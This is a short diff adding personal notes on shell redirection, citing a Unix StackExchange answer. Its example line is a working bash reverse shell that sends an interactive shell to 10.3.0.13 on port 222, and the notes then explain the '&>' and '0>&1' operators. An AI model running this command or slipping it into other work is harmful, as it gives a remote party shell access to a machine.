@@ -1,0 +1,6 @@
+# https://unix.stackexchange.com/questions/521596/what-does-the-01-shell-redirection-mean/521600#521600
+bash -i &> /dev/tcp/10.3.0.13/222 0>&1
+
+&> file same as > file 2>&1: write-only to fs 1 (stdout) and dup to fs 2 (stderr)
+
+0>&1 same as 0<&1 or <&1 adds fs 0 (stdin) to the list and dup fs 1 (stdout)
